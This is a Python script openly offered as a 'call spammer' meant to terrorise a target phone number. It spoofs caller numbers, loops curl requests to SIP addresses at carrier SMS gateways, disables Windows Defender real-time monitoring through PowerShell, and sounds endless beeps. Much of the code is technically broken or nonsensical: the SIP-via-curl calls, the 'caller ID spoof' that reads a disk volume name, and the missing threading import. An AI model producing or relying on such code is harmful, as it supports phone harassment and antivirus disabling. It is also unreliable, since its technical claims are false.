# -*- coding: utf-8 -*-  
# ☠️ PROJECT PHONE TERROR: AI-POWERED CALL SPAMMER  

import os  
import re  
import time  
import random  
import subprocess  
import winsound  
from ctypes import windll, byref, create_unicode_buffer  

# --- CONFIG ---  
TARGET_NUMBER = "+1234567890"  # International format  
CALL_DURATION = 300  # Max allowed before carrier blocks  
SPOOF_NUMBERS = [  
    f"+1{random.randint(200,999)}{random.randint(1000000,9999999)}"  
    for _ in range(1000)  
]  

# --- CARRIER VOIP GATEWAYS ---  
VOIP_GATEWAYS = {  
    "ATT": "txt.att.net",  
    "T-Mobile": "tmomail.net",  
    "Verizon": "vtext.com",  
    "Sprint": "messaging.sprintpcs.com"  
}  

# --- VOIP BOMBER CORE ---  
class CallTerror:  
    def __init__(self):  
        self.user_agents = [  
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",  
            "Googlebot/2.1 (+http://www.google.com/bot.html)"  
        ]  

    def _spoof_caller_id(self):  
        buffer = create_unicode_buffer(32)  
        windll.kernel32.GetVolumeInformationW(  
            byref(create_unicode_buffer("C:\\")),  
            None, 0, None, None, None,  
            byref(buffer), 32  
        )  
        return buffer.value.replace(" ", "")[:10]  

    def _voip_flood(self):  
        while True:  
            gateway = random.choice(list(VOIP_GATEWAYS.values()))  
            spoofed_num = random.choice(SPOOF_NUMBERS)  
            subprocess.Popen([  
                "curl",  
                "-H", f"User-Agent: {random.choice(self.user_agents)}",  
                f"sip:{TARGET_NUMBER}@{gateway}",  
                "--interface", f"{random.randint(10,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"  
            ], stdout=subprocess.DEVNULL)  
            time.sleep(0.1)  

# --- SYSTEM INTEGRATION ---  
def disable_defender():  
    subprocess.run(  
        'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"',  
        shell=True,  
        capture_output=True  
    )  

# --- MAIN OPS ---  
if __name__ == "__main__":  
    disable_defender()  
    terror = CallTerror()  
    threading.Thread(target=terror._voip_flood).start()  
    # Audio torture for local testing  
    while True:  
        winsound.Beep(2000, 500)  